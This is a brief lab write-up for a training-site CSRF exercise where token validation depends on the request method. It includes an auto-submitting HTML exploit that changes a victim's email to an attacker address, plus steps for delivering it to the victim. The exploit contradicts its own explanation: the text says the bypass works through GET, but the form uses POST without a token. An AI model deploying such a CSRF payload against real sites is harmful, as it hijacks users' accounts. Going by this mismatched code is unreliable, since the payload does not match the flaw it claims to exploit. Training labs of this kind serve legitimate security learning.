# Lab 10: CSRF where token validation depends on request method

## Lab URL
https://0a7a00ef0420980d801ae564007400ef.web-security-academy.net

## Vulnerability
The application validates CSRF token only on POST method. When changing email via GET method, token validation is bypassed.

Endpoint: `/my-account/change-email`

## Exploit Code (exploit.html)
```html
<html>
  <body>
    <form action="https://0a7a00ef0420980d801ae564007400ef.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
Steps to Solve
1.Login with wiener:peter
2.Go to exploit server
3.Paste exploit code in Body
4.Store and Deliver to victim
5.Lab solved

Proof
![Solved](Lab10-CSRF-Solved.png)
